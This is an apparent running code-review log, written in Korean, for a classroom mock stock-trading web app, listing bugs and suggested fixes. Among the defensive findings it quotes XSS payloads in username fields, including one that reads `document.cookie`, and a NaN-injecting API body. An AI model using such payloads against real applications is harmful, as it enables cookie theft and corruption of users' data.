- **`get_history()` '1년' 기간 bar 수 누락** (stock_service.py:292~293): `n_bars` 딕셔너리에 `'1y'` 키가 없어 `default=30`이 적용됨. '1달(30개)'과 '1년(30개)'이 동일한 bar 수를 사용해 두 차트가 사실상 같은 밀도로 표시됨. `'1y': 52` 추가(주봉 52주)하거나, index.html:683 '1년' 탭을 제거해 혼란 방지.

- **`member_total_value()` N+1 쿼리** (app.py:107~118, get_rankings:815, host_members:542): `get_rankings()`, `host_members()` 모두 참가자 수만큼 루프 안에서 `member_total_value(rid, uid)` 호출 → 각 호출마다 `RoomHolding.query.filter_by()` + `Deposit.query.filter_by()` 실행. 30명 기준 ~60 추가 쿼리. `RoomHolding.query.filter_by(room_id=rid).all()` 한 번으로 전원 holdings를 미리 로드한 뒤 `uid` 기준 dict로 분류하면 쿼리 수를 2~3개로 줄임. Render 무료 플랜의 SQLite 환경에서 응답 지연 원인.

- **`gen_code()` 10회 시도 후 중복 코드 반환 가능** (models.py:8~13): 10회 모두 충돌 시 마지막 코드를 `unique=True` 검증 없이 반환. 실제 충돌 확률은 낮지만, 마지막 `return` 전 `if Room.query.filter_by(code=code).first(): raise RuntimeError('코드 생성 실패')` 한 줄로 무결성 보장.

- **`api.get/post` 실패 시 무음 처리** (app.js:29~45): `if (!r.ok) return {error: \`HTTP ${r.status}\`}` 후 대부분의 호출자가 `if (data.error) return;`로 조용히 종료. 네트워크 오류 시 UI가 멈춘 상태로 보여도 사용자는 원인을 모름. `console.error` 한 줄 + 중요 폴링(`pollInterval`, `newsInterval`) 실패 시 `toast('서버 연결 오류', 'error')` 추가로 교실 내 트러블슈팅 시간 단축.

- **참가자 로비 화면 규칙 안내 부재** (index.html:340~352, screen-p-lobby): 학생들이 진행자 시작을 대기하는 동안 게임 규칙을 볼 방법이 없음. 로비 하단에 "❓ 규칙 보기" 버튼 하나를 추가해 `openRules()` 호출하면 됨(`modal-rules`는 이미 존재, index.html:837). 코드 3줄.

---

## 2026-07-14 (2차)

### 추가하면 좋을 기능

- **예금 이자 예상액이 일시정지 시간을 반영하지 않는 표시 버그** (`app.py:858-876`): `get_deposits()` 에서 `expected_interest` 를 계산할 때 `held = (now - d.created_at).total_seconds()` 로 벽시계 기준 경과 시간을 사용함. 복권(~1.5분)·룰렛(~2분)·호스트 수동 일시정지가 누적되면 game_end 기반의 `_end_room()` 정산(line 138)보다 높은 이자가 학생 화면에 표시됨. 예컨대 총 5분 정지가 발생하면 30분 게임에서 약 17% 과대 표시. 단순 수정: `ratio` 계산을 `remaining_seconds / total_seconds` 방식(게임에 남은 시간 기반)으로 변경하면 현재 `create_deposit()` 응답(line 897)과 동일한 방식으로 통일되고 일시정지 시간이 자동 보정됨.

- **모바일 숫자 입력 키패드 최적화** (`index.html` 숫자 입력 필드 전반): `trade-qty`(거래 수량), `dep-amount`(예금 금액), `rlt-bet`(룰렛 베팅), `adj-delta`(자산 조정), `lot-prize`(복권 상금) 등 `<input type="number">` 필드에 `inputmode="numeric"` 속성이 없어 모바일에서 전체 문자 키보드가 펼쳐짐. `inputmode="numeric" pattern="[0-9]*"` 속성을 각 숫자 입력 필드에 추가하면 iOS·Android에서 숫자 전용 키패드가 열려 교실 스마트폰 사용 학생의 거래 속도와 오타 감소에 직접 기여. 서버 변경 불필요, `index.html` 8~10 곳의 1줄 수정.

- **시장 탭 종목 카드에 "내가 보유 중" 뱃지 표시** (`app.js:1287-1330 renderGrid()`): 현재 시장 탭 종목 카드에는 내가 이미 보유 중인 종목인지 시각적으로 표시되지 않아, 확인을 위해 포트폴리오 탭으로 이동해야 함. `loadPortfolio()` 완료 시 `S.myHoldings = Object.fromEntries(data.holdings.map(h => [h.symbol, h.shares]))` 를 캐시하고, `renderGrid()` 내 카드 생성 시 `if (S.myHoldings?.[st.symbol] > 0)` 이면 카드 우상단에 `<span class="owned-badge">보유 ${n}주</span>` 뱃지를 추가. `execTrade()` 성공 후 `loadPortfolio()` 호출 시 자동 갱신. 서버 신규 API 불필요, 클라이언트 전용 구현.

- **배당금 시뮬레이션 기능** (신규 `stock_service.py` + `app.py`): 현재 수익 경로가 주가 상승·룰렛·복권으로 한정되어 있어 "배당주 vs 성장주" 개념 수업이 어려움. 금융(`KBFIN`, `SHFIN` 등)·통신(`SKTEL`, `KTCOR`)·에너지 섹터 종목 보유자에게 게임 경과 시간 비례 배당금을 지급하는 기능 추가. `StockService` 에 `_dividend_last_ts: dict` 추가, `get_room()` 폴링 시 일정 간격(예: 게임 시간의 1/6) 초과 시 해당 섹터 보유 `RoomMember` 에 `RoomTransaction(action='ADJ', note='분기 배당금')` 생성. `Room` 모델에 `dividend_enabled BOOLEAN DEFAULT FALSE` 컬럼으로 교사가 수업 목적에 따라 활성화 제어.

- **학생 자기 탈퇴(Leave Room) API 추가** (`app.py` 신규 엔드포인트): 학생이 QR 코드를 잘못 스캔해 엉뚱한 방에 입장했을 때 나갈 방법이 없음. 진행자 강퇴(`kick_member`, `app.py:564-575`)는 호스트만 가능하고 `waiting` 상태로 제한됨. `DELETE /api/rooms/<int:rid>/leave` 엔드포인트를 추가해 `room.status == 'waiting'` 에서만 `RoomMember.query.filter_by(room_id=rid, user_id=user.id).delete()` 를 허용하면 됨. `active`·`paused` 상태 이탈은 막아 진행 중 무단 탈퇴 방지. 프론트엔드는 참가자 로비 화면에 "나가기" 버튼 1개 추가로 연결.

---

### 제거/단순화할 것들

- **`app.py:38-40` 마이그레이션 블록의 `except Exception` 이 치명적 오류를 무음 처리**: `ALTER TABLE` 실패를 수용하기 위해 `except Exception: db.session.rollback()` 으로 모든 예외를 삼키지만, DB 연결 실패·파일시스템 오류·권한 문제 등 실제로 대응이 필요한 오류도 같은 코드 경로로 들어와 배포 직후 마이그레이션 실패를 탐지할 수 없음. `from sqlalchemy.exc import OperationalError` 로 import 후 `except OperationalError` 로 범위를 좁히고, `app.logger.warning(f"DB migration skip (likely already exists): {e}")` 로그 한 줄 추가 권장. 그 외 예외는 재발생(`raise`)시켜 배포 실패를 즉시 알 수 있게 함.

- **`app.py:595` `host_adjust()` `delta` 파라미터에 NaN·Infinity 허용**: `delta = float(d.get('delta', 0))` 에서 Python `float()` 는 문자열 `'nan'`, `'inf'`, `'-inf'` 를 예외 없이 변환. 악의적 API 호출로 `{"delta": "nan"}` 을 보내면 `m.cash = max(0, m.cash + float('nan'))` → `float('nan')` 이 되어 학생 자산이 NaN으로 오염됨. 이후 `get_rankings()` 정렬(`sort(key=lambda x: x['total_value'], reverse=True)`)에서 NaN 비교 오류, `export_rankings()` 엑셀 숫자 서식에서 오류가 전파됨. `from math import isfinite; if not isfinite(delta): return jsonify({'error': '잘못된 값'}), 400` 한 줄 추가 또는 `delta = max(-500_000_000, min(500_000_000, delta))` 클램핑으로 방어.

- **`stock_service.py:285-309` `get_history()` 동시 호출 시 TOCTOU 패턴으로 차트 불일치**: lock 해제 후 `bars` 를 랜덤 생성하고 다시 lock 취득 후 저장하는 구조(`stock_service.py:285-288`에서 캐시 확인, 289에서 lock 해제, 292~306 루프, 308-309에서 저장). 두 스레드가 동시에 캐시 미스를 확인하면 각각 다른 `random.gauss()` 시퀀스로 bars를 생성해 하나가 다른 것을 덮어씀. 결과적으로 두 학생이 동시에 같은 종목 차트를 열면 이전 버전이 남은 학생이 발생. 해결책: `bars` 생성 루프 전체를 `with self._lock:` 블록 안으로 이동하거나, `random.seed(f"{symbol}-{period}-{int(time.time()//120)}")` 로 시드를 시간 블록 기반으로 고정해 동일 120초 창 내 요청이 항상 동일한 차트를 반환하도록 보장.

- **`app.py:653-654` `get_stocks()` 에서 `Room.query.get_or_404(rid)` 반환값 미사용**: `get_stocks()` 첫 줄 `Room.query.get_or_404(rid)` 가 반환값 없이 호출됨. 방 유효성 검증 의도는 명확하나, 반환 `room` 객체를 변수에 담지 않아 코드 리뷰어에게 사용 목적이 불투명함. 동일 패턴이 `get_room_news()` (line 705-706)에도 반복됨. `db.get_or_404(Room, rid)` (Flask-SQLAlchemy 3.x 권장) 또는 최소한 `_ = Room.query.get_or_404(rid)` 형태로 의도를 명시. 나아가 두 엔드포인트 모두 `room.status` 가 `ended` 인 경우 `StockService` 가 존재하지 않을 수 있어(cleanup 이후) `get_room_service(rid)` 가 새 인스턴스를 생성하는 부작용도 병행 점검 권장.

- **`app.py:977` `minigame_close()` 내 `Room.query.get(rid)` deprecated 패턴 미수정**: 2026-06-23(2차) 분석에서 지적됐으나 이 한 줄만 남아있음. `with _rlt_lock:` 블록 내에서 `room = Room.query.get(rid)` 를 사용해 SQLAlchemy 2.x deprecated 경고 발생. `db.session.get(Room, rid)` 로 교체하고, `if not room: state['auto_paused'] = False; return jsonify({'ok': True})` 조기 반환을 추가하면 방이 이미 삭제된 엣지 케이스도 방어됨. `_rlt_lock` 보유 중 DB 조회를 수행하는 구조적 문제(07-12(2차)에서 지적)의 부분 개선으로도 연결됨.


---

## 2026-07-15

### 추가하면 좋을 기능

- **`get_history()` 가 실제 게임 내 가격 이력이 아닌 랜덤 워크 데이터 반환** (`stock_service.py:281-309`): 종목 상세 모달에서 "1달" 차트를 보면 과거 30일치 가격 데이터가 표시되지만, 이는 현재 가격에서 역산한 `random.gauss()` 기반 가상 데이터임. 게임 중 실제 발생한 가격 변동(호스트 강제 조정·뉴스 이벤트 효과 포함)이 차트에 전혀 반영되지 않아 "내가 샀을 때보다 얼마나 올랐는가"를 시각적으로 확인 불가. `get_price()` 가 가격을 업데이트할 때(`stock_service.py:185`) `self._price_history.setdefault(sym, []).append({'ts': now, 'price': new_price})` 로 이력을 누적하고, `get_history()` 가 이 게임 내 실제 이력을 반환하도록 변경하면 수업 복기에 직접 활용 가능. 기존 `_history_cache` 무효화 로직은 그대로 재사용 가능.

- **게임 종료 후 같은 방 코드로 재시작 기능 없음** (`app.py:363-390`, `models.py:25-41`): 수업에서 "1라운드 끝나고 한 번 더"를 원할 때 새 방을 만들면 코드가 바뀌어 학생 전원이 QR을 다시 스캔해야 함. `POST /api/rooms/<rid>/restart` 엔드포인트를 추가해 `room.status = 'waiting'`, `RoomMember.cash = room.starting_cash` 리셋, `RoomHolding` + `Deposit` 삭제, `room.code` 유지 — 학생들은 이미 이 방의 멤버이므로 기존 폴링(`enterParticipantLobby`, `app.js:562-576`)에서 status 변화만 감지하면 자동 로비 복귀 가능. 서버 재시작 없이 연속 라운드 진행 가능.

- **진행자가 개별 학생의 현재 포트폴리오를 볼 수 없음** (`app.py:542-562`): 호스트 순위 탭에서 거래 내역은 확인 가능하지만 "지금 이 학생이 어떤 주식을 얼마나 보유 중인가"를 실시간으로 볼 방법이 없음. `GET /api/rooms/<rid>/host/members/<int:uid>/portfolio` 엔드포인트를 추가하고 기존 `get_portfolio()` 로직(`app.py:772-803`)을 `user_id` 파라미터만 교체해 재사용. 거래 조정 모달(`modal-adjust`) 열기 전 포트폴리오 요약을 노출하면 교사가 학생 투자 전략을 즉석에서 파악 가능.

- **결과 화면 username을 `innerHTML`에 직접 삽입 — XSS 취약** (`app.js` `loadResults()` 결과 목록 렌더링): 게임 결과 화면 `screen-results`에서 참가자 이름(`username`)을 `innerHTML` 에 직접 삽입할 경우, `<img src=x onerror=alert(1)>` 같은 이름을 입력한 학생이 같은 방의 다른 학생 화면에서 JS를 실행시킬 수 있음. `escHtml()` 함수가 이미 `app.js:897-900`에 정의되어 있으므로, 결과 목록·우승자 카드·퀴즈/복권 결과 등 이름 삽입 부분에 `escHtml(m.username)` 를 일관되게 적용하는 것으로 해결. 서버 변경 불필요.

- **`goHome()` 호출 시 항상 로그아웃 처리 — 재참여 불편** (`app.js:108-112`): 결과 화면의 "홈으로" 버튼과 게임 중 "나가기" 버튼 모두 `goHome()` 을 통해 `api.post('/api/auth/logout', {})` 를 호출함. 교실에서 같은 기기로 다음 라운드에 재참여하려면 학번·이름을 다시 입력해야 해 불편. 결과 화면 "홈으로"는 로그아웃 없이 `showLanding()` 만 호출하고, 로그아웃은 랜딩 화면의 별도 명시적 버튼에서만 실행하도록 분리 권장. `confirmLeaveGame()` 도 진행 중 탈퇴이므로 로그아웃 여부를 별도 선택지로 제공하면 다중 라운드 수업에서 세션 관리가 편해짐.

### 제거/단순화할 것들

- **`_rlt_active`, `_quiz_settings`, `_roulette_config` 가 서버 재시작 시 초기화** (`app.py:250-252, 1246, 1363`): `_lots` (복권)는 `room.lottery_rounds_done` DB 컬럼으로 복구 로직이 존재하지만(`app.py:174-179`), 룰렛 설정(`_roulette_config`), 퀴즈 보상 설정(`_quiz_settings`), 진행 중 룰렛 카운터(`_rlt_active`)는 모두 in-memory dict이고 복구 로직이 없음. Render 무료 플랜은 비활성 시 컨테이너를 내리므로 수업 중간 재시작이 발생하면 룰렛 배율이 기본값으로 초기화되고, 이미 룰렛을 열었던 학생 카운터가 0으로 리셋되어 동일 게임에서 추가 스핀이 가능해지는 버그 발생. `roulette_config` 와 `quiz_settings` 는 `Room` 테이블 JSON 컬럼으로 저장하거나, `_rlt_active[rid]` 상태는 `get_room()` 에서 `RoomTransaction.query.filter_by(action='RLT')` 집계로 복구하는 방식 권장.

- **`trade()` 에서 현금 검증-차감 사이 TOCTOU race condition** (`app.py:747-753`): `if member.cash < amount: return ...` 체크 직후 `member.cash -= amount` 사이에 동일 사용자의 두 번째 요청이 도달하면 양쪽 모두 잔액 검증을 통과해 음수 현금이 발생 가능. 현재 SQLite + WAL 환경에서는 Python GIL이 대부분 보호하지만 `DATABASE_URL` 을 PostgreSQL로 교체하면 실제 race condition이 됨. `db.session.refresh(member, lockmode='update')` 를 체크 직전에 추가하거나, 최소한 `member.cash = max(0, member.cash - amount)` 후 음수 여부를 재확인해 롤백하는 패턴 적용.

- **`lobby_members()` 가 진행자 멤버 여부를 필터링하지 않음** (`app.py:577-585`): `host/lobby-members` 엔드포인트는 `RoomMember.query.filter_by(room_id=rid).all()` 로 전체를 반환. `join_room()` 내 `if room.host_id != user.id` 조건(`app.py:400`)이 있어 일반적으로 진행자는 `RoomMember` 에 추가되지 않지만, 진행자 본인이 QR 코드를 스캔해 실수로 참가한 경우 참가자 목록에 진행자 이름이 포함됨. 진행자가 복권·룰렛 상금을 수령하는 부작용도 함께 발생. `host/lobby-members` 반환 시 `[m for m in members if m.user_id != room.host_id]` 필터 한 줄 추가 권장.

- **`create_deposit()` 에서 `amount` 상한 검증 없음** (`app.py:887-889`): `if not (0 < amount < float('inf'))` 만 체크. 실질적으로 `m.cash < amount` 잔액 검증이 막아주지만, `host_adjust()` 에 NaN·Infinity 버그(이전 분석 2026-07-14(2차) 참조)로 `m.cash` 가 오염된 상태라면 이 방어막이 무력화됨. `if amount > 10_000_000_000: return jsonify({'error': '예금 한도 초과'}), 400` 상한선 추가로 방어 계층 추가.

- **`refreshMyRank()` 에서 rankings API를 단독 호출해 불필요한 중복 쿼리 발생** (`app.js:735-753`, `app.py:808-824`): `enterParticipantGame()` 의 10초 폴링 블록 안에서 `refreshMyRank()` (line 647)와 `if (S.currentPage === 'market') loadMarket()` (line 648)이 별개로 실행됨. `refreshMyRank()` 는 `GET /api/rooms/<rid>/rankings` 를 호출해 전원 순위를 불러오고, 그 중 `is_me: true` 인 항목만 사용. 이미 같은 폴링 루프에서 `api.get('/api/rooms/<rid>')` 를 통해 `remaining_seconds` 등 방 상태를 받는데, 개인 순위를 `room` 응답에 포함하거나 `portfolio` 응답의 `total_value` 를 재활용하면 랭킹 API 추가 호출 1회를 줄일 수 있음. 참가자 30명 기준 10초마다 30번의 중복 rankings 쿼리가 Render 무료 플랜 DB에 부담.

---

## 2026-07-15 (2차)

### 추가하면 좋을 기능

- **종목 모달에 현재 보유 종목 수익/손실 표시 없음** (`app.js:1344-1357`, `openStockModal()`): 종목 카드 클릭 시 `openStockModal()` 이 `/portfolio` 를 호출해 `cash` 와 보유 주식 수(`S.tradeHolding`)를 표시하지만, 동일 응답에 포함된 `h.avg_price`, `h.gain`, `h.gain_pct` 는 화면에 렌더링하지 않음. 이미 조회한 데이터를 버리는 셈. `document.getElementById('ms-holding').textContent = S.tradeHolding + '주'` 코드 아래에 `if (h) { document.getElementById('ms-holding-gain').textContent = pct(h.gain_pct) + ' / ' + krw(h.gain); }` 형태로 추가하면 학생이 매도 타이밍을 모달 안에서 즉시 판단 가능. 서버 변경 불필요.

- **교육 탭 가이드·팁 응답을 캐시하지 않아 탭 전환마다 재요청** (`app.js:1899-1901`, `switchEduTab()`): `glossary` 탭은 `if (!S.glossaryData.length)` 조건으로 한 번만 API를 호출하지만, `guides` 와 `tips` 는 `loadGuides()` / `loadTips()` 가 탭 전환마다 무조건 호출됨. 이 데이터는 게임 중 서버에서 절대 변하지 않는 정적 콘텐츠. `S` 객체에 `guidesData: []` 와 `tipsData: []` 를 추가하고 첫 로드 후 저장, 이후 탭 전환 시 캐시된 값으로 `renderGuides(S.guidesData)` / `renderTips(S.tipsData)` 를 직접 호출하도록 수정. 탭 전환 속도 즉시화, 서버 API 호출 감소.

- **복권 당첨 결과가 진행자 화면에만 표시되고 전체 참가자 공지 기능 없음** (`app.py:1130-1147`, `app.js:_checkLotteryStatus`): `get_lottery()` 응답에서 `all_results` 는 `room.host_id == user.id` 일 때만 반환됨. 일반 참가자는 `my_result` 만 볼 수 있어, 당첨자 발표가 진행자 화면에서만 이뤄지고 나머지 학생은 결과 화면을 스크롤해 확인해야 함. `POST /api/rooms/<rid>/lottery/broadcast` 엔드포인트를 추가해 당첨자 목록을 `Room.notice_text` 필드(2026-07-14 제안)에 저장하거나, 복권 결과 요약을 `/api/rooms/<rid>/news` 형식으로 감싸 폭탄뉴스 팝업으로 표시하면 수업 현장에서 환호감 효과 극대화.

- **진행자 이벤트 이력(audit log)이 전혀 기록되지 않음** (`app.py:673-700`, `app.py:1345-1360`): 진행자가 특정 종목 강제 조정(`force_price`), 섹터 이벤트(`market_event`), 퀴즈 설정 변경(`quiz_settings`) 등을 언제 발동했는지 서버 어디에도 기록되지 않음. 수업 후 "3시에 삼성전자를 -20% 조정했을 때 학생들이 어떻게 반응했는가"를 복기할 자료가 없음. `RoomTransaction` 에 `action='EVT'` 타입으로 `(room_id, user_id=host_id, symbol=대상, note=이벤트 설명, amount=pct)` 를 기록하거나, 별도 `RoomEvent` 모델을 최소화해 추가하면 호스트 결과 화면의 타임라인으로 활용 가능. 서버 측 3개 엔드포인트에 `db.session.add(RoomTransaction(...))` 한 줄씩이면 구현 완료.

- **타이머가 클라이언트 로컬 시계에만 의존해 누적 오차 발생** (`app.js:756-776`, `startTimer()`): `setInterval(tick, 1000)` 으로 매 초마다 `new Date(S.room.end_time) - new Date()` 를 계산하지만, 10초 폴링이 `S.room.end_time` 을 갱신하기 전까지는 서버의 pause·resume 상태 변화를 타이머에 즉시 반영할 수 없음. 또한 JS 이벤트 루프 지연으로 `setInterval` 콜백이 실제 1000ms보다 수십ms 늦게 실행되어 누적 오차가 발생, 10분 게임에서 ~5초 차이가 생길 수 있음. 해결책: 매 `tick()` 에서 `S.room.remaining_seconds - (Date.now() - lastPollTs) / 1000` 형태로 서버 기준 잔여 시간에 클라이언트 경과 시간을 보정해 표시, 10초 폴링 수신 시 `lastPollTs = Date.now()` 를 갱신하는 방식으로 누적 오차 제거.

---

### 제거/단순화할 것들

- **로비 참가자 목록에서 `m.username` 이 `innerHTML` 에 직접 삽입 — XSS 취약** (`app.js:224-231`, `app.js:582-585`): `loadLobbyMembers()` 의 `${m.username}` 과 `loadPLobbyMembers()` 의 `${m.username}` 이 모두 HTML 문자열 내 `innerHTML` 에 이스케이프 없이 삽입됨. `<img src=x onerror=alert(document.cookie)>` 같은 이름의 학생이 입장하면 같은 방의 진행자·참가자 브라우저에서 JS가 실행됨. `escHtml()` 함수(`app.js:897`)가 이미 코드베이스에 존재하고, 결과 화면(`app.js:1748`)에는 이미 적용돼 있으므로 로비 멤버 렌더링 두 곳에 `escHtml(m.username)` 으로 교체만 하면 됨. 진행자 멤버 행의 onclick attribute injection (`app.js:229, 426`)도 동일한 패턴으로 취약.

- **`minigame_spin()` 에서 스핀 횟수 검사와 레코드 삽입 사이 동시성 취약** (`app.py:1009-1067`): `spins_used = RoomTransaction.query.filter_by(room_id=rid, user_id=user.id, action='RLT').count()` 후 `if spins_used >= 3:` 체크와 실제 `db.session.add(RoomTransaction(action='RLT', ...))` 사이에 아무런 락이 없음. 동일 사용자의 두 HTTP 요청이 거의 동시에 도달하면 둘 다 `count() == 2` 를 확인하고 통과해 룰렛을 4회 이상 돌릴 수 있음. `_rlt_lock` 으로 감싸거나, 최소한 커밋 후 `spins_used` 를 재확인해 초과 시 롤백하는 guard를 추가해야 함. `trade()` 의 TOCTOU (2026-07-14 2차 참조)와 동일한 패턴이 스핀에도 존재.

- **`get_room()` 핸들러에서 `cur_user()` 를 반복 호출해 DB 조회 낭비** (`app.py:432-473`): `cur_user()` 는 `db.session.get(User, session['user_id'])` 를 실행하는 DB 조회. `get_room()` 내에서 line 439 (`cur_user().id`), line 444 (`cur_user().id`), line 465 (`cur_user().id`), line 473 (`cur_user().id`) 까지 최대 4회 중복 호출됨. 함수 진입부에 `user = cur_user(); uid = user.id` 로 한 번만 가져와 재사용하면 동일 요청 당 DB 조회 3회 절약. 10초 폴링 시 참가자 30명 기준 분당 90회의 불필요한 User SELECT 제거 가능.

- **`host_member_transactions()` · `get_transactions()` 에서 특수 심볼 이름 오표시** (`app.py:619-622`, `app.py:840-842`): `STOCKS.get(t.symbol, {}).get('name', '자산조정')` 패턴이 `'ROULETTE'`, `'LOTTO'`, `'DEPOSIT'` 심볼을 모두 `'자산조정'` 으로 표시. 학생이 거래 내역을 보면 룰렛·복권·예금 해지 이벤트가 모두 '자산조정'으로 보여 원인 파악이 어려움. `SPECIAL_SYMBOLS = {'ROULETTE': '룰렛', 'LOTTO': '복권', 'DEPOSIT': '예금'}` dict를 `app.py` 상단에 정의하고, 이름 조회 로직을 `SPECIAL_SYMBOLS.get(t.symbol) or STOCKS.get(t.symbol, {}).get('name', '자산조정')` 으로 교체하면 두 엔드포인트 모두 즉시 개선.

- **`trade()` · `create_deposit()` · `host_market_event()` 에서 `bare except` 사용** (`app.py:738-739`, `app.py:887-888`, `app.py:1353`): 세 곳 모두 `try: ... except: return jsonify(...)` 형태로 예외를 잡음. `bare except:` 는 `Exception` 외에 `SystemExit`, `KeyboardInterrupt`, `GeneratorExit` 까지 포획해 프로세스 종료 신호를 삼킬 수 있음. `except (TypeError, ValueError):` 로 범위를 좁혀야 의도치 않은 시스템 예외가 묻히지 않고 정상적으로 전파됨. `except Exception` 으로 넓게 잡을 경우에도 `app.logger.warning(f"parse error: {e}")` 로그를 남겨 Render 대시보드에서 이상 입력을 탐지할 수 있도록 해야 함.

---

## 2026-07-16

### 추가하면 좋을 기능

- **QR 스캔 후 방 코드 자동 입력** (`app.js:197-198`, `static/index.html:318-321`): `_makeQR()`이 생성하는 URL이 `?code=XXXXXX` 쿼리 파라미터를 포함하는데, 참여자는 QR 스캔 후에도 방 코드 입력란에 여전히 코드를 직접 타이핑해야 함. `DOMContentLoaded` 이벤트에서 `const c = new URLSearchParams(location.search).get('code'); if (c) document.getElementById('join-code').value = c;` 5줄을 추가하고, `showScreen('screen-join')`까지 자동 이동하면 QR 스캔→입장 흐름이 원클릭으로 완성됨. 서버 변경 전혀 불필요.

- **복권 비활성화 옵션(진행자)** (`app.py:408-430`, `models.py:25-42`): 현재 게임 시간에 따라 2회~6회 복권이 자동 트리거되는데, 교사가 복권 없이 순수 주식 투자만 진행하고 싶을 경우 끌 방법이 없음. `Room` 모델에 `lottery_enabled = db.Column(db.Boolean, default=True)` 컬럼을 추가하고, `_lot_round_due()`(`app.py:171`) 상단에 `if not room.lottery_enabled: return None` 한 줄과, 방 생성 폼(`index.html:62-76`)에 토글 체크박스를 추가하면 해결. 마이그레이션은 기존 ALTER TABLE 패턴(`app.py:31-40`)으로 안전하게 처리 가능.

- **진행자 대시보드에서 종목별 매수/매도 압력 표시** (`app.py:806-824`, `app.js:408-431`): 랭킹 탭에 학생 자산 순위만 있고, 지금 어떤 종목이 가장 많이 거래되는지 교사가 파악할 방법이 없음. `GET /api/rooms/<rid>/host/hot-stocks` 엔드포인트를 추가해 `RoomTransaction.query.filter_by(room_id=rid).filter(~RoomTransaction.action.in_(['ADJ','RLT'])).order_by(RoomTransaction.timestamp.desc()).limit(50)` 에서 종목별 BUY/SELL 빈도를 집계하면 "지금 가장 많이 매수: 삼성전자 12건"처럼 표시 가능. 교사의 수업 개입 타이밍(해당 종목 뉴스 이벤트 발동 등)을 안내하는 데 유용.

- **게임 종료 후 개인 거래 통계 요약** (`app.py:1417-1488`, `app.js:loadResults()` 주변): 현재 결과 화면은 최종 순위와 자산 차트만 보여줌. 개별 학생에게 "총 거래 횟수, 최고 수익 종목, 최대 손실 종목" 요약을 함께 보여주면 수업 후 토론("왜 이 종목에 집중했나요?")의 소재가 생김. `RoomTransaction` 집계(`group by symbol`)는 `get_portfolio()`나 `export_rankings()` 근방에 헬퍼 함수를 추가하는 수준으로 구현 가능. 결과 화면의 `div#results-my-stats` (`index.html:628`)가 이미 자리를 잡아두고 있어 UI 변경도 최소화됨.

- **복권 진행 중 참가자 제출 현황 진행자에게 노출** (`app.py:1114-1147`): 진행자가 복권 대기 모달을 보는 동안 몇 명이 번호를 제출했는지 알 방법이 없음. `get_lottery()` 응답에 호스트 전용으로 `submitted_count: int` 와 `total_eligible: int` 필드를 추가(`cur.get('picks',{})` 길이와 `eligible` 계산을 재활용)하면 "12명 중 8명 제출" 식의 텍스트를 진행자 복권 모달(`index.html:744-748`)에 표시 가능. 서버 20줄, 프론트 5줄.

- **기본 secret key 노출 위험 경고 로그** (`app.py:13`): `app.secret_key`에 `'mock-stock-game-secret-2024'` 하드코딩된 기본값이 사용됨. Render에서 `SECRET_KEY` 환경변수를 설정하지 않으면 이 값이 그대로 쓰임. 앱 시작 시 `if app.secret_key == 'mock-stock-game-secret-2024': import warnings; warnings.warn('SECRET_KEY가 기본값! 반드시 환경변수를 설정하세요.')` 한 줄을 추가하면 배포 설정 누락을 조기에 발견 가능.

### 제거/단순화할 것들

- **`username` = `"학번 이름"` 단일 필드 합산 구조의 취약성** (`app.js:75`, `app.py:1435`): `doAuth()`에서 `${sid} ${name}` 형태로 합쳐 서버에 전달하고, 엑셀 export에서 `u.username.split(' ', 1)`로 다시 분리함. 학번에 공백이 들어가거나(`"20 715"`), 진행자가 학번 없이 이름만 입력하면(`"홍길동"`) export 시 `sid=''`, `name='홍길동'`으로 처리되어 학번 컬럼이 비어버림. `User` 모델에 `student_id` 컬럼을 분리하거나, 최소한 클라이언트 입력 유효성 검사(`학번에 공백 금지`)를 강화해 파싱 실패를 예방해야 함.

- **메모리 전용 게임 설정의 Render 재시작 손실** (`app.py:250-251`, `1246-1247`): `_roulette_config`와 `_quiz_settings`가 프로세스 메모리에만 존재해, Render free tier의 15분 비활성화 재시작 시 진행자가 설정한 룰렛 배율·퀴즈 보상/패널티가 초기화됨. `Room` 모델에 `roulette_config_json`·`quiz_settings_json` 텍스트 컬럼을 추가하거나(기존 ALTER TABLE 패턴 재활용), 최소한 설정 API 응답에 "서버 재시작 시 초기화됨" 주의 문구를 추가해 교사가 혼란을 겪지 않도록 해야 함.

- **참여자가 `/host/lobby-members` 엔드포인트 직접 호출** (`app.js:579`): `loadPLobbyMembers()`에서 참여자가 `/api/rooms/${rid}/host/lobby-members`를 폴링함. URL에 'host'가 포함되어 있지만 서버(`app.py:577-585`)는 방 ID만 검증하고 호스트 여부를 확인하지 않아 누구나 접근 가능. `lobby_members()` 엔드포인트의 `@login_required` 이후에 역할 구분 없이 전원 허용하는 건 의도적 설계로 보이지만, URL이 혼동을 줌. 참여자용 `/api/rooms/<rid>/members`로 분리하거나 동일 엔드포인트에서 경로만 `/api/rooms/<rid>/lobby-members`로 변경해 직관성을 높이는 게 좋음.

- **`loadMarket()` 내 `prevPrices` 초기화 방식이 매 호출마다 전체 배열 순회** (`app.js:1229-1241`): `const prev = Object.fromEntries(S.stocks.map(s => [s.symbol, s.price]))` 패턴이 10초마다 실행됨. 46개 종목이므로 성능 영향은 미미하지만, `S.stocks`를 Map으로 관리하면 `prev.get(sym)` 조회가 O(1)로 일관됨. 학생 수가 많은 교실에서 브라우저 부하를 줄이는 데 기여하며 코드 의도도 명확해짐.

- **참여자 폴링 주기(10초)와 뉴스 폴링 주기(8초)의 불규칙 중복 호출** (`app.js:611-650`, `app.js:810-819`): 참여자 게임에서 10초마다 `/api/rooms/<rid>` GET 1회 + 조건부 `loadMarket()` 1회 + `refreshMyRank()` 1회(→ `/rankings` GET)가 실행됨. 여기에 8초 뉴스 폴링까지 더해지면 분당 최대 ~20건의 API 요청이 단일 탭에서 발생. Render free tier의 콜드스타트 이후 초반 급증 시 병목이 됨. `refreshMyRank()` 호출을 폴링 사이클 안으로 편입해 `/rankings` 호출을 `/api/rooms/<rid>` 응답에 순위 정보를 포함시키는 방향으로 통합하거나, 뉴스와 게임 상태를 단일 엔드포인트에서 받아오는 식으로 합치면 요청 수가 절반 이하로 줄어듦.

---

---

## 2026-07-16 (2차)

### 추가하면 좋을 기능

- **뉴스 이력 조회 기능** (`stock_service.py:110-113`, `app.js:807-826`): `StockService._news` 는 최신 뉴스 한 건만 보관해 3초 팝업이 사라진 후 다시 볼 방법이 없음. 수업 중 학생이 팝업을 놓치면 주가 변동 이유를 알 수 없어 교육적 불이익 발생. `self._news_history: list = []` (최대 10개 deque)를 `StockService`에 추가하고 `_generate_news()` / `trigger_news()` 호출 시 append, `GET /api/rooms/<rid>/news/history` 엔드포인트를 노출하면 참가자 화면에 "🗞 뉴스 기록" 버튼 하나로 재열람 가능. 서버 15줄, 프론트 25줄 수준의 변경.

